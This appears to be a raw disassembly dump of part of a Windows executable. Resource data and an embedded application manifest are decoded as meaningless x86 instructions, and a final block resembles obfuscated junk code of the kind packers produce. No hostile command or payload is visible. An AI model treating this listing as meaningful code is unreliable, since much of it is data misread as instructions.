  40963d:	84 98 ad 24 2b 37    	test   %bl,0x372b24ad(%eax)
  409643:	89 62 ac             	mov    %esp,-0x54(%edx)
  409646:	92                   	xchg   %eax,%edx
  409647:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409648:	11 52 10             	adc    %edx,0x10(%edx)
  40964b:	44                   	inc    %esp
  40964c:	30 0f                	xor    %cl,(%edi)
  40964e:	14 8d                	adc    $0x8d,%al
  409650:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409651:	11 11                	adc    %edx,(%ecx)
  409653:	11 11                	adc    %edx,(%ecx)
  409655:	0a 90 96 a8 a0 90    	or     -0x6f5f576a(%eax),%dl
  40965b:	a9 7f 7e a6 a6       	test   $0xa6a67e7f,%eax
  409660:	28 98 50 9a aa 54    	sub    %bl,0x54aa9a50(%eax)
  409666:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409667:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409668:	68 52 71 a7 13       	push   $0x13a77152
  40966d:	10 10                	adc    %dl,(%eax)
  40966f:	8d 96 11 11 11 11    	lea    0x11111111(%esi),%edx
  409675:	1e                   	push   %ds
  409676:	97                   	xchg   %eax,%edi
  409677:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409678:	1e                   	push   %ds
  409679:	1e                   	push   %ds
  40967a:	a1 9b 90 18 a6       	mov    0xa618909b,%eax
  40967f:	98                   	cwtl
  409680:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409681:	78 7e                	js     0x409701
  409683:	81 6a 58 a7 58 0c 13 	subl   $0x130c58a7,0x58(%edx)
  40968a:	0c 15                	or     $0x15,%al
  40968c:	0e                   	push   %cs
  40968d:	15 10 8d 19 72       	adc    $0x72198d10,%eax
  409692:	52                   	push   %edx
  409693:	11 11                	adc    %edx,(%ecx)
  409695:	11 a0 88 11 11 a1    	adc    %esp,-0x5eeeee78(%eax)
  40969b:	a0 97 18 98 98       	mov    0x98981897,%al
  4096a0:	82 79 99 03          	cmpb   $0x3,-0x67(%ecx)
  4096a4:	5b                   	pop    %ebx
  4096a5:	a2 5c a3 a4 a5       	mov    %al,0xa5a4a35c
  4096aa:	58                   	pop    %eax
  4096ab:	39 a5 0e 8d 31 9b    	cmp    %esp,-0x64ce72f2(%ebp)
  4096b1:	91                   	xchg   %eax,%ecx
  4096b2:	9c                   	pushf
  4096b3:	91                   	xchg   %eax,%ecx
  4096b4:	11 11                	adc    %edx,(%ecx)
  4096b6:	50                   	push   %eax
  4096b7:	9c                   	pushf
  4096b8:	25 8a 96 95 84       	and    $0x8495968a,%eax
  4096bd:	73 26                	jae    0x4096e5
  4096bf:	26 6d                	es insl (%dx),%es:(%edi)
  4096c1:	77 77                	ja     0x40973a
  4096c3:	1a 03                	sbb    (%ebx),%al
  4096c5:	9d                   	popf
  4096c6:	1b 80 61 4a 9e 5f    	sbb    0x5f9e4a61(%eax),%eax
  4096cc:	43                   	inc    %ebx
  4096cd:	9f                   	lahf
  4096ce:	2e 68 94 67 67 95    	cs push $0x95676794
  4096d4:	96                   	xchg   %eax,%esi
  4096d5:	97                   	xchg   %eax,%edi
  4096d6:	90                   	nop
  4096d7:	97                   	xchg   %eax,%edi
  4096d8:	90                   	nop
  4096d9:	97                   	xchg   %eax,%edi
  4096da:	73 73                	jae    0x40974f
  4096dc:	78 8b                	js     0x409669
  4096de:	98                   	cwtl
  4096df:	88 18                	mov    %bl,(%eax)
  4096e1:	99                   	cltd
  4096e2:	25 9a 81 81 80       	and    $0x8081819a,%eax
  4096e7:	9a 3d 05 64 07 1e 68 	lcall  $0x681e,$0x764053d
  4096ee:	2e 31 8e 80 8f 90 91 	xor    %ecx,%cs:-0x6e6f7080(%esi)
  4096f5:	92                   	xchg   %eax,%edx
  4096f6:	83 91 7b 34 05 80 87 	adcl   $0xffffff87,-0x7ffacb85(%ecx)
  4096fd:	3d 93 8e 03 86       	cmp    $0x86038e93,%eax
  409702:	78 6d                	js     0x409771
  409704:	8a 7e 18             	mov    0x18(%esi),%bh
  409707:	03 25 81 1b 53 11    	add    0x11531b81,%esp
  40970d:	15 12 68 29 80       	adc    $0x80296812,%eax
  409712:	7d 19                	jge    0x40972d
  409714:	69 7d 83 84 77 79 03 	imul   $0x3797784,-0x7d(%ebp),%edi
  40971b:	04 85                	add    $0x85,%al
  40971d:	34 85                	xor    $0x85,%al
  40971f:	6c                   	insb   (%dx),%es:(%edi)
  409720:	25 86 87 88 7b       	and    $0x7b888786,%eax
  409725:	1b 89 85 8a 1a 8b    	sbb    -0x74e5757b(%ecx),%ecx
  40972b:	8c 11                	mov    %ss,(%ecx)
  40972d:	71 12                	jno    0x409741
  40972f:	8d 34 61             	lea    (%ecx,%eiz,2),%esi
  409732:	7d 7e                	jge    0x4097b2
  409734:	79 7f                	jns    0x4097b5
  409736:	7d 80                	jge    0x4096b8
  409738:	6d                   	insl   (%dx),%es:(%edi)
  409739:	77 74                	ja     0x4097af
  40973b:	1a 3d 07 6c 55 25    	sbb    0x25556c07,%bh
  409741:	78 81                	js     0x4096c4
  409743:	81 6a 78 5b 82 77 25 	subl   $0x2577825b,0x78(%edx)
  40974a:	6b 31 0d             	imul   $0xd,(%ecx),%esi
  40974d:	10 21                	adc    %ah,(%ecx)
  40974f:	0d 07 48 67 77       	or     $0x77674807,%eax
  409754:	78 72                	js     0x4097c8
  409756:	54                   	push   %esp
  409757:	79 03                	jns    0x40975c
  409759:	74 78                	je     0x4097d3
  40975b:	06                   	push   %es
  40975c:	34 66                	xor    $0x66,%al
  40975e:	63 6b 3d             	arpl   %ebp,0x3d(%ebx)
  409761:	76 25                	jbe    0x409788
  409763:	74 7a                	je     0x4097df
  409765:	78 1a                	js     0x409781
  409767:	7b 1a                	jnp    0x409783
  409769:	1c 7c                	sbb    $0x7c,%al
  40976b:	0f                   	(bad)
  40976c:	0f 21 12             	mov    %db2,%edx
  40976f:	68 56 63 67 04       	push   $0x4676356
  409774:	62 72 73             	bound  %esi,0x73(%edx)
  409777:	74 64                	je     0x4097dd
  409779:	75 6c                	jne    0x4097e7
  40977b:	2a 07                	sub    (%edi),%al
  40977d:	40                   	inc    %eax
  40977e:	66 07                	popw   %es
  409780:	4f                   	dec    %edi
  409781:	6b 6c 76 6c 1a       	imul   $0x1a,0x6c(%esi,%esi,2),%ebp
  409786:	77 78                	ja     0x409800
  409788:	3d 58 0f 0f 0f       	cmp    $0xf0f0f58,%eax
  40978d:	0f 12 31             	movlps (%ecx),%xmm6
  409790:	59                   	pop    %ecx
  409791:	5c                   	pop    %esp
  409792:	69 5b 48 57 18 5a 57 	imul   $0x575a1857,0x48(%ebx),%ebx
  409799:	6a 42                	push   $0x42
  40979b:	42                   	inc    %edx
  40979c:	08 40 2c             	or     %al,0x2c(%eax)
  40979f:	37                   	aaa
  4097a0:	4e                   	dec    %esi
  4097a1:	37                   	aaa
  4097a2:	6b 41 6c 1a          	imul   $0x1a,0x6c(%ecx),%eax
  4097a6:	6d                   	insl   (%dx),%es:(%edi)
  4097a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097a9:	10 70 12             	adc    %dh,0x12(%eax)
  4097ac:	12 21                	adc    (%ecx),%ah
  4097ae:	70 71                	jo     0x409821
  4097b0:	4b                   	dec    %ebx
  4097b1:	5f                   	pop    %edi
  4097b2:	60                   	pusha
  4097b3:	41                   	inc    %ecx
  4097b4:	4e                   	dec    %esi
  4097b5:	61                   	popa
  4097b6:	62 63 53             	bound  %esp,0x53(%ebx)
  4097b9:	64 3e 65 38 08       	fs ds cmp %cl,%gs:(%eax)
  4097be:	08 4a 4a             	or     %cl,0x4a(%edx)
  4097c1:	2c 66                	sub    $0x66,%al
  4097c3:	53                   	push   %ebx
  4097c4:	1b 5b 1b             	sbb    0x1b(%ebx),%ebx
  4097c7:	67 1f                	addr16 pop %ds
  4097c9:	11 11                	adc    %edx,(%ecx)
  4097cb:	11 11                	adc    %edx,(%ecx)
  4097cd:	11 23                	adc    %esp,(%ebx)
  4097cf:	68 59 5a 57 4f       	push   $0x4f575a59
  4097d4:	53                   	push   %ebx
  4097d5:	5b                   	pop    %ebx
  4097d6:	57                   	push   %edi
  4097d7:	5c                   	pop    %esp
  4097d8:	2b 4e 2b             	sub    0x2b(%esi),%ecx
  4097db:	38 0b                	cmp    %cl,(%ebx)
  4097dd:	38 08                	cmp    %cl,(%eax)
  4097df:	4b                   	dec    %ebx
  4097e0:	40                   	inc    %eax
  4097e1:	38 0b                	cmp    %cl,(%ebx)
  4097e3:	37                   	aaa
  4097e4:	41                   	inc    %ecx
  4097e5:	2a 4e 0c             	sub    0xc(%esi),%cl
  4097e8:	11 11                	adc    %edx,(%ecx)
  4097ea:	11 11                	adc    %edx,(%ecx)
  4097ec:	3b 17                	cmp    (%edi),%edx
  4097ee:	5d                   	pop    %ebp
  4097ef:	5e                   	pop    %esi
  4097f0:	53                   	push   %ebx
  4097f1:	54                   	push   %esp
  4097f2:	50                   	push   %eax
  4097f3:	53                   	push   %ebx
  4097f4:	55                   	push   %ebp
  4097f5:	46                   	inc    %esi
  4097f6:	2b 37                	sub    (%edi),%esi
  4097f8:	1d 56 08 0b 38       	sbb    $0x380b0856,%eax
  4097fd:	2c 08                	sub    $0x8,%al
  4097ff:	43                   	inc    %ebx
  409800:	0b 1e                	or     (%esi),%ebx
  409802:	3f                   	aas
  409803:	38 57 49             	cmp    %dl,0x49(%edi)
  409806:	58                   	pop    %eax
  409807:	11 11                	adc    %edx,(%ecx)
  409809:	11 44 17 17          	adc    %eax,0x17(%edi,%edx,1)
  40980d:	17                   	pop    %ss
  40980e:	17                   	pop    %ss
  40980f:	32 48 4e             	xor    0x4e(%eax),%cl
  409812:	4f                   	dec    %edi
  409813:	07                   	pop    %es
  409814:	1b 50 37             	sbb    0x37(%eax),%edx
  409817:	37                   	aaa
  409818:	2c 08                	sub    $0x8,%al
  40981a:	0b 38                	or     (%eax),%edi
  40981c:	2c 2c                	sub    $0x2c,%al
  40981e:	4a                   	dec    %edx
  40981f:	0b 0a                	or     (%edx),%ecx
  409821:	1e                   	push   %ds
  409822:	1e                   	push   %ds
  409823:	09 51 08             	or     %edx,0x8(%ecx)
  409826:	52                   	push   %edx
  409827:	11 0e                	adc    %ecx,(%esi)
  409829:	4c                   	dec    %esp
  40982a:	17                   	pop    %ss
  40982b:	17                   	pop    %ss
  40982c:	4c                   	dec    %esp
  40982d:	20 12                	and    %dl,(%edx)
  40982f:	31 46 47             	xor    %eax,0x47(%esi)
  409832:	07                   	pop    %es
  409833:	42                   	inc    %edx
  409834:	48                   	dec    %eax
  409835:	49                   	dec    %ecx
  409836:	2c 08                	sub    $0x8,%al
  409838:	38 08                	cmp    %cl,(%eax)
  40983a:	08 2c 37             	or     %ch,(%edi,%esi,1)
  40983d:	37                   	aaa
  40983e:	4a                   	dec    %edx
  40983f:	0b 3f                	or     (%edi),%edi
  409841:	3f                   	aas
  409842:	1e                   	push   %ds
  409843:	38 4b 38             	cmp    %cl,0x38(%ebx)
  409846:	44                   	inc    %esp
  409847:	4c                   	dec    %esp
  409848:	17                   	pop    %ss
  409849:	17                   	pop    %ss
  40984a:	4d                   	dec    %ebp
  40984b:	2e 10 11             	adc    %dl,%cs:(%ecx)
  40984e:	11 44 1c 34          	adc    %eax,0x34(%esp,%ebx,1)
  409852:	34 41                	xor    $0x41,%al
  409854:	42                   	inc    %edx
  409855:	1d 40 0b 2c 37       	sbb    $0x372c0b40,%eax
  40985a:	1d 2b 1d 37 38       	sbb    $0x38371d2b,%eax
  40985f:	0a 0a                	or     (%edx),%cl
  409861:	3f                   	aas
  409862:	0a 0b                	or     (%ebx),%cl
  409864:	43                   	inc    %ebx
  409865:	0a 44 17 45          	or     0x45(%edi,%edx,1),%al
  409869:	20 2f                	and    %ch,(%edi)
  40986b:	0f 11 11             	movups %xmm2,(%ecx)
  40986e:	11 31                	adc    %esi,(%ecx)
  409870:	06                   	push   %es
  409871:	27                   	daa
  409872:	3d 34 3e 2b 1d       	cmp    $0x1d2b3e34,%eax
  409877:	36 35 35 36 2b 1d    	ss xor $0x1d2b3635,%eax
  40987d:	38 09                	cmp    %cl,(%ecx)
  40987f:	0a 3f                	or     (%edi),%bh
  409881:	0a 0b                	or     (%ebx),%cl
  409883:	40                   	inc    %eax
  409884:	09 11                	or     %edx,(%ecx)
  409886:	32 3b                	xor    (%ebx),%bh
  409888:	3c 3c                	cmp    $0x3c,%al
  40988a:	0f 11 11             	movups %xmm2,(%ecx)
  40988d:	11 11                	adc    %edx,(%ecx)
  40988f:	31 33                	xor    %esi,(%ebx)
  409891:	33 28                	xor    (%eax),%ebp
  409893:	28 28                	sub    %ch,(%eax)
  409895:	27                   	daa
  409896:	34 27                	xor    $0x27,%al
  409898:	34 35                	xor    $0x35,%al
  40989a:	36 37                	ss aaa
  40989c:	38 09                	cmp    %cl,(%ecx)
  40989e:	0a 0a                	or     (%edx),%cl
  4098a0:	09 0a                	or     %ecx,(%edx)
  4098a2:	09 39                	or     %edi,(%ecx)
  4098a4:	3a 3b                	cmp    (%ebx),%bh
  4098a6:	20 3c 30             	and    %bh,(%eax,%esi,1)
  4098a9:	0f 12 11             	movlps (%ecx),%xmm2
  4098ac:	11 11                	adc    %edx,(%ecx)
  4098ae:	11 31                	adc    %esi,(%ecx)
  4098b0:	24 25                	and    $0x25,%al
  4098b2:	26 27                	es daa
  4098b4:	28 24 29             	sub    %ah,(%ecx,%ebp,1)
  4098b7:	28 2a                	sub    %ch,(%edx)
  4098b9:	2b 2c 0b             	sub    (%ebx,%ecx,1),%ebp
  4098bc:	09 0a                	or     %ecx,(%edx)
  4098be:	09 09                	or     %ecx,(%ecx)
  4098c0:	0a 0a                	or     (%edx),%cl
  4098c2:	0a 2d 0f 20 2e 2f    	or     0x2f2e200f,%ch
  4098c8:	30 30                	xor    %dh,(%eax)
  4098ca:	10 11                	adc    %dl,(%ecx)
  4098cc:	11 11                	adc    %edx,(%ecx)
  4098ce:	31 32                	xor    %esi,(%edx)
  4098d0:	18 19                	sbb    %bl,(%ecx)
  4098d2:	18 1a                	sbb    %bl,(%edx)
  4098d4:	1a 1a                	sbb    (%edx),%bl
  4098d6:	1b 1c 1d 08 0a 1e 0a 	sbb    0xa1e0a08(,%ebx,1),%ebx
  4098dd:	0b 0b                	or     (%ebx),%ecx
  4098df:	0a 0a                	or     (%edx),%cl
  4098e1:	1f                   	pop    %ds
  4098e2:	20 20                	and    %ah,(%eax)
  4098e4:	0d 0f 21 22 22       	or     $0x2222210f,%eax
  4098e9:	21 11                	and    %edx,(%ecx)
  4098eb:	11 11                	adc    %edx,(%ecx)
  4098ed:	23 17                	and    (%edi),%edx
  4098ef:	17                   	pop    %ss
  4098f0:	01 02                	add    %eax,(%edx)
  4098f2:	03 04 05 06 07 08 09 	add    0x9080706(,%eax,1),%eax
  4098f9:	0a 09                	or     (%ecx),%cl
  4098fb:	0b 0b                	or     (%ebx),%ecx
  4098fd:	0b 0a                	or     (%edx),%ecx
  4098ff:	0c 0d                	or     $0xd,%al
  409901:	0e                   	push   %cs
  409902:	0f 10 11             	movups (%ecx),%xmm2
  409905:	12 13                	adc    (%ebx),%dl
  409907:	14 10                	adc    $0x10,%al
  409909:	11 15 16 17 17 17    	adc    %edx,0x17171716
  40990f:	17                   	pop    %ss
	...
  409990:	00 00                	add    %al,(%eax)
  409992:	01 00                	add    %eax,(%eax)
  409994:	01 00                	add    %eax,(%eax)
  409996:	20 20                	and    %ah,(%eax)
  409998:	00 00                	add    %al,(%eax)
  40999a:	01 00                	add    %eax,(%eax)
  40999c:	08 00                	or     %al,(%eax)
  40999e:	a8 08                	test   $0x8,%al
  4099a0:	00 00                	add    %al,(%eax)
  4099a2:	01 00                	add    %eax,(%eax)
  4099a4:	00 00                	add    %al,(%eax)
  4099a6:	00 00                	add    %al,(%eax)
  4099a8:	3c 3f                	cmp    $0x3f,%al
  4099aa:	78 6d                	js     0x409a19
  4099ac:	6c                   	insb   (%dx),%es:(%edi)
  4099ad:	20 76 65             	and    %dh,0x65(%esi)
  4099b0:	72 73                	jb     0x409a25
  4099b2:	69 6f 6e 3d 27 31 2e 	imul   $0x2e31273d,0x6e(%edi),%ebp
  4099b9:	30 27                	xor    %ah,(%edi)
  4099bb:	20 65 6e             	and    %ah,0x6e(%ebp)
  4099be:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4099c1:	69 6e 67 3d 27 55 54 	imul   $0x5455273d,0x67(%esi),%ebp
  4099c8:	46                   	inc    %esi
  4099c9:	2d 38 27 20 73       	sub    $0x73202738,%eax
  4099ce:	74 61                	je     0x409a31
  4099d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099d1:	64 61                	fs popa
  4099d3:	6c                   	insb   (%dx),%es:(%edi)
  4099d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4099d6:	65 3d 27 79 65 73    	gs cmp $0x73657927,%eax
  4099dc:	27                   	daa
  4099dd:	3f                   	aas
  4099de:	3e 0a 3c 61          	or     %ds:(%ecx,%eiz,2),%bh
  4099e2:	73 73                	jae    0x409a57
  4099e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4099e6:	62 6c 79 20          	bound  %ebp,0x20(%ecx,%edi,2)
  4099ea:	78 6d                	js     0x409a59
  4099ec:	6c                   	insb   (%dx),%es:(%edi)
  4099ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ee:	73 3d                	jae    0x409a2d
  4099f0:	27                   	daa
  4099f1:	75 72                	jne    0x409a65
  4099f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f4:	3a 73 63             	cmp    0x63(%ebx),%dh
  4099f7:	68 65 6d 61 73       	push   $0x73616d65
  4099fc:	2d 6d 69 63 72       	sub    $0x7263696d,%eax
  409a01:	6f                   	outsl  %ds:(%esi),(%dx)
  409a02:	73 6f                	jae    0x409a73
  409a04:	66 74 2d             	data16 je 0x409a34
  409a07:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  409a0a:	3a 61 73             	cmp    0x73(%ecx),%ah
  409a0d:	6d                   	insl   (%dx),%es:(%edi)
  409a0e:	2e 76 31             	jbe,pn 0x409a42
  409a11:	27                   	daa
  409a12:	20 6d 61             	and    %ch,0x61(%ebp)
  409a15:	6e                   	outsb  %ds:(%esi),(%dx)
  409a16:	69 66 65 73 74 56 65 	imul   $0x65567473,0x65(%esi),%esp
  409a1d:	72 73                	jb     0x409a92
  409a1f:	69 6f 6e 3d 27 31 2e 	imul   $0x2e31273d,0x6e(%edi),%ebp
  409a26:	30 27                	xor    %ah,(%edi)
  409a28:	3e 0a 20             	or     %ds:(%eax),%ah
  409a2b:	3c 74                	cmp    $0x74,%al
  409a2d:	72 75                	jb     0x409aa4
  409a2f:	73 74                	jae    0x409aa5
  409a31:	49                   	dec    %ecx
  409a32:	6e                   	outsb  %ds:(%esi),(%dx)
  409a33:	66 6f                	outsw  %ds:(%esi),(%dx)
  409a35:	20 78 6d             	and    %bh,0x6d(%eax)
  409a38:	6c                   	insb   (%dx),%es:(%edi)
  409a39:	6e                   	outsb  %ds:(%esi),(%dx)
  409a3a:	73 3d                	jae    0x409a79
  409a3c:	22 75 72             	and    0x72(%ebp),%dh
  409a3f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a40:	3a 73 63             	cmp    0x63(%ebx),%dh
  409a43:	68 65 6d 61 73       	push   $0x73616d65
  409a48:	2d 6d 69 63 72       	sub    $0x7263696d,%eax
  409a4d:	6f                   	outsl  %ds:(%esi),(%dx)
  409a4e:	73 6f                	jae    0x409abf
  409a50:	66 74 2d             	data16 je 0x409a80
  409a53:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  409a56:	3a 61 73             	cmp    0x73(%ecx),%ah
  409a59:	6d                   	insl   (%dx),%es:(%edi)
  409a5a:	2e 76 33             	jbe,pn 0x409a90
  409a5d:	22 3e                	and    (%esi),%bh
  409a5f:	0a 20                	or     (%eax),%ah
  409a61:	20 20                	and    %ah,(%eax)
  409a63:	3c 73                	cmp    $0x73,%al
  409a65:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a69:	69 74 79 3e 0a 20 20 	imul   $0x2020200a,0x3e(%ecx,%edi,2),%esi
  409a70:	20 
  409a71:	20 20                	and    %ah,(%eax)
  409a73:	3c 72                	cmp    $0x72,%al
  409a75:	65 71 75             	gs jno 0x409aed
  409a78:	65 73 74             	gs jae 0x409aef
  409a7b:	65 64 50             	gs fs push %eax
  409a7e:	72 69                	jb     0x409ae9
  409a80:	76 69                	jbe    0x409aeb
  409a82:	6c                   	insb   (%dx),%es:(%edi)
  409a83:	65 67 65 73 3e       	gs addr16 gs jae 0x409ac6
  409a88:	0a 20                	or     (%eax),%ah
  409a8a:	20 20                	and    %ah,(%eax)
  409a8c:	20 20                	and    %ah,(%eax)
  409a8e:	20 20                	and    %ah,(%eax)
  409a90:	3c 72                	cmp    $0x72,%al
  409a92:	65 71 75             	gs jno 0x409b0a
  409a95:	65 73 74             	gs jae 0x409b0c
  409a98:	65 64 45             	gs fs inc %ebp
  409a9b:	78 65                	js     0x409b02
  409a9d:	63 75 74             	arpl   %esi,0x74(%ebp)
  409aa0:	69 6f 6e 4c 65 76 65 	imul   $0x6576654c,0x6e(%edi),%ebp
  409aa7:	6c                   	insb   (%dx),%es:(%edi)
  409aa8:	20 6c 65 76          	and    %ch,0x76(%ebp,%eiz,2)
  409aac:	65 6c                	gs insb (%dx),%es:(%edi)
  409aae:	3d 27 61 73 49       	cmp    $0x49736127,%eax
  409ab3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab4:	76 6f                	jbe    0x409b25
  409ab6:	6b 65 72 27          	imul   $0x27,0x72(%ebp),%esp
  409aba:	20 75 69             	and    %dh,0x69(%ebp)
  409abd:	41                   	inc    %ecx
  409abe:	63 63 65             	arpl   %esp,0x65(%ebx)
  409ac1:	73 73                	jae    0x409b36
  409ac3:	3d 27 66 61 6c       	cmp    $0x6c616627,%eax
  409ac8:	73 65                	jae    0x409b2f
  409aca:	27                   	daa
  409acb:	20 2f                	and    %ch,(%edi)
  409acd:	3e 0a 20             	or     %ds:(%eax),%ah
  409ad0:	20 20                	and    %ah,(%eax)
  409ad2:	20 20                	and    %ah,(%eax)
  409ad4:	3c 2f                	cmp    $0x2f,%al
  409ad6:	72 65                	jb     0x409b3d
  409ad8:	71 75                	jno    0x409b4f
  409ada:	65 73 74             	gs jae 0x409b51
  409add:	65 64 50             	gs fs push %eax
  409ae0:	72 69                	jb     0x409b4b
  409ae2:	76 69                	jbe    0x409b4d
  409ae4:	6c                   	insb   (%dx),%es:(%edi)
  409ae5:	65 67 65 73 3e       	gs addr16 gs jae 0x409b28
  409aea:	0a 20                	or     (%eax),%ah
  409aec:	20 20                	and    %ah,(%eax)
  409aee:	3c 2f                	cmp    $0x2f,%al
  409af0:	73 65                	jae    0x409b57
  409af2:	63 75 72             	arpl   %esi,0x72(%ebp)
  409af5:	69 74 79 3e 0a 20 3c 	imul   $0x2f3c200a,0x3e(%ecx,%edi,2),%esi
  409afc:	2f 
  409afd:	74 72                	je     0x409b71
  409aff:	75 73                	jne    0x409b74
  409b01:	74 49                	je     0x409b4c
  409b03:	6e                   	outsb  %ds:(%esi),(%dx)
  409b04:	66 6f                	outsw  %ds:(%esi),(%dx)
  409b06:	3e 0a 3c 2f          	or     %ds:(%edi,%ebp,1),%bh
  409b0a:	61                   	popa
  409b0b:	73 73                	jae    0x409b80
  409b0d:	65 6d                	gs insl (%dx),%es:(%edi)
  409b0f:	62 6c 79 3e          	bound  %ebp,0x3e(%ecx,%edi,2)
  409b13:	0a 00                	or     (%eax),%al
	...
  409bfd:	00 00                	add    %al,(%eax)
  409bff:	00 63 22             	add    %ah,0x22(%ebx)
  409c02:	a2 45 8d 58 34       	mov    %al,0x34588d45
  409c07:	c1 8c 2a b4 69 41 ad 	rorl   $0x7d,-0x52be964c(%edx,%ebp,1)
  409c0e:	7d 
  409c0f:	b4 06                	mov    $0x6,%ah
  409c11:	45                   	inc    %ebp
  409c12:	99                   	cltd
  409c13:	e9 93 f3 18 de       	jmp    0xde598fab
  409c18:	e9 b3 f2 5d 8f       	jmp    0x8f9e8ed0
  409c1d:	dc 68 1c             	fsubrl 0x1c(%eax)
  409c20:	80 fa 16             	cmp    $0x16,%dl
  409c23:	6b 05 51 ab 0b ed fe 	imul   $0xfffffffe,0xed0bab51,%eax
  409c2a:	8e 08                	mov    (%eax),%cs
  409c2c:	8d 6b 57             	lea    0x57(%ebx),%ebp
  409c2f:	7d a2                	jge    0x409bd3
  409c31:	bd 73 37 c2 f8       	mov    $0xf8c23773,%ebp
  409c36:	b9 84 4d ae 52       	mov    $0x52ae4d84,%ecx
  409c3b:	70 a2                	jo     0x409bdf
  409c3d:	b4 c8                	mov    $0xc8,%ah
  409c3f:	4a                   	dec    %edx
  409c40:	9d                   	popf
  409c41:	d0 c1                	rol    $1,%cl
  409c43:	9e                   	sahf
  409c44:	e9 06 de 47 53       	jmp    0x53887a4f
  409c49:	2c 75                	sub    $0x75,%al
  409c4b:	dd b3 84 cc 4b 67    	fnsave 0x674bcc84(%ebx)
  409c51:	2b 30                	sub    (%eax),%esi
  409c53:	aa                   	stos   %al,%es:(%edi)
  409c54:	2e f3 ea 13 3d 72 04 	cs repz ljmp $0x67cf,$0x4723d13
  409c5b:	cf 67 
  409c5d:	fe                   	(bad)
  409c5e:	54                   	push   %esp
  409c5f:	6d                   	insl   (%dx),%es:(%edi)
  409c60:	1b 56 80             	sbb    -0x80(%esi),%edx
  409c63:	f9                   	stc
  409c64:	42                   	inc    %edx
  409c65:	86 ff                	xchg   %bh,%bh
  409c67:	c6 47 87 d0          	movb   $0xd0,-0x79(%edi)
  409c6b:	69 d3 06 c0 c9 62    	imul   $0x62c9c006,%ebx,%edx
  409c71:	46                   	inc    %esi
  409c72:	86 e7                	xchg   %ah,%bh
  409c74:	81 ea a8 ea 7e 85    	sub    $0x857eeaa8,%edx
  409c7a:	1c d0                	sbb    $0xd0,%al
  409c7c:	0f af eb             	imul   %ebx,%ebp
  409c7f:	80 f0 19             	xor    $0x19,%al
  409c82:	0f be fe             	movsbl %dh,%edi
  409c85:	f6 c4 47             	test   $0x47,%ah
  409c88:	1d d5 4a 38 47       	sbb    $0x47384ad5,%eax
  409c8d:	3b c7                	cmp    %edi,%eax
  409c8f:	c6 c6 c3             	mov    $0xc3,%dh
  409c92:	72 0a                	jb     0x409c9e
  409c94:	39 f0                	cmp    %esi,%eax
  409c96:	f7 c0 53 90 e6 73    	test   $0x73e69053,%eax
  409c9c:	85 c8                	test   %ecx,%eax
  409c9e:	68 61 b8 6c 00       	push   $0x6cb861
  409ca3:	76 07                	jbe    0x409cac
  409ca5:	0f af ee             	imul   %esi,%ebp
  409ca8:	89 fd                	mov    %edi,%ebp
  409caa:	1c 59                	sbb    $0x59,%al
  409cac:	fe ce                	dec    %dh
  409cae:	85 d1                	test   %edx,%ecx
  409cb0:	8a df                	mov    %bh,%bl
  409cb2:	80 d4 82             	adc    $0x82,%ah
  409cb5:	f7 c5 ee 56 ca 53    	test   $0x53ca56ee,%ebp
  409cbb:	88 e4                	mov    %ah,%ah
  409cbd:	8b d1                	mov    %ecx,%edx
  409cbf:	f7 c2 32 8b af 52    	test   $0x52af8b32,%edx
  409cc5:	40                   	inc    %eax
  409cc6:	8d 1d 1e 30 aa 2b    	lea    0x2baa301e,%ebx
  409ccc:	85 d1                	test   %edx,%ecx
  409cce:	85 c9                	test   %ecx,%ecx
  409cd0:	32 d8                	xor    %al,%bl
  409cd2:	2b ea                	sub    %edx,%ebp
  409cd4:	c7 c3 e5 fb 95 1e    	mov    $0x1e95fbe5,%ebx
  409cda:	05 6c 62 5b 18       	add    $0x185b626c,%eax
  409cdf:	ba d7 1f c0 7d       	mov    $0x7dc01fd7,%edx
  409ce4:	83 e3 00             	and    $0x0,%ebx
  409ce7:	38 e0                	cmp    %ah,%al
  409ce9:	88 dc                	mov    %bl,%ah
  409ceb:	0a f1                	or     %cl,%dh
  409ced:	0f af fb             	imul   %ebx,%edi
  409cf0:	bd 52 ea f3 b0       	mov    $0xb0f3ea52,%ebp
  409cf5:	f6 c0 71             	test   $0x71,%al
  409cf8:	f3 81 c3 49 f9 ff ff 	repz add $0xfffff949,%ebx
  409cff:	8d 05 4f 9c 3f cd    	lea    0xcd3f9c4f,%eax
  409d05:	84 c8                	test   %cl,%al
  409d07:	81 c3 b8 06 00 00    	add    $0x6b8,%ebx
  409d0d:	86 c4                	xchg   %al,%ah
  409d0f:	8b f6                	mov    %esi,%esi
  409d11:	11 f0                	adc    %esi,%eax
  409d13:	8b d5                	mov    %ebp,%edx
  409d15:	8d 3d 68 34 33 db    	lea    0xdb333468,%edi
  409d1b:	81 fb 24 01 00 00    	cmp    $0x124,%ebx
  409d21:	0f 86 c0 ff ff ff    	jbe    0x409ce7
  409d27:	69 d2 95 76 be e0    	imul   $0xe0be7695,%edx,%edx
  409d2d:	8a d0                	mov    %al,%dl
  409d2f:	8d 35 80 76 d4 7d    	lea    0x7dd47680,%esi
  409d35:	c7 c0 ef 28 39 f7    	mov    $0xf73928ef,%eax
  409d3b:	f6 c5 e9             	test   $0xe9,%ch
  409d3e:	b8 0a 2a 0c 60       	mov    $0x600c2a0a,%eax
  409d43:	86 de                	xchg   %bl,%dh
  409d45:	89 cf                	mov    %ecx,%edi
  409d47:	8d 2d 14 de 57 62    	lea    0x6257de14,%ebp
  409d4d:	34 ab                	xor    $0xab,%al
  409d4f:	86 c4                	xchg   %al,%ah
